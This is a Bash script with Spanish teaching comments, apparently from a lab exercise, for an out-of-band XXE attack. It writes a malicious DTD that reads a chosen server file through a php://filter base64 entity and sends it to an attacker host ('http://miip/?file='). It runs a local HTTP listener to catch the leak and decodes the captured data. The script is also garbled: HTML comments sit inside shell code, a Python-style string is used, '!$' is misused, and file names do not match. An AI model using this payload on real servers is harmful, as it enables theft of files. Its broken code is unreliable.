# XXE_OOB
#Metete en el codigo para ver comentado cada comando
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r miarchivo
<!--e para aplicar el salto de linea (caracteres especiales
-n para poder meter el input en la misma linea que el echo
 read lee el input del usuari y lo guarda en mi rchivo
-r para que acepte espacios y de todo, guarde el input literal-->

malicious_dtd=""" # triple comilla para pillar varias lineas de codigo
<!--ojo por que hayque escapar las comillas con \-->
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$miarchivo\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://miip/?file=%file; '>\"> 
<!--ojo por que al crear una entidad dentro de otra entidad, hay que representarla en hexadecimal
 para representar % en hexadecimal se deberia de poner %#x y luego su valor en hexadecimal y luego ;, que es 25 -> &#x25;
 exfil es una entidad dentro de otra 
 ahora habria que llamar a las entidades eval y exfil para que tdo sea ejecutado.-->
%eval;
%exfil;
<!--file no hace falta por que se llama desde exfil-->
"""

echo $malicious_dtd > malicious.dtd
<!--tenemos que volcar todo en el archivo, por que en la peticion se leera de ese archivo-->

python3 -m http.server 80 &>respuesta &
<!--mandamos el sterr y el stdout a respuesta y lo ponemos en segundo plano-->
PID=!$
<!--!$ hace referencia l elemento anterior y si ha sido puesto en segundo plano se guarda si PID-->
sleep 1 
<!--daremos unos segundos a que se levnate el servidor-->


<!--aqui meteremos la peticion, podemos obtenerla dl raw de burpsuite, por ejemplo:-->

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?><root><name>Juan</name><tel>6666666666</tel><email>juan@mola.com</email><password>juan123</password></root>'
<!--s , silencioso, no mostrara output
-X , indica el metodo, en este caso por post
process.php es a donde se hace la petición
-d , incluir datos que queramos que viajen con la peticion-->

cat reponse | grep -oP "/?file=\K[^-*\s]+" | base64 -d

kill -9 $PID
<!--matamos l proceso del PID-->
wait $PID 2>/dev/null
<!--speraremos a que muera el PID y redirigiremos el stout al dev null para no ver el process killed-->




<!--Ahora se guarda y cuando se ejecute, epodremos hacer cat response  ver el output guardado-->


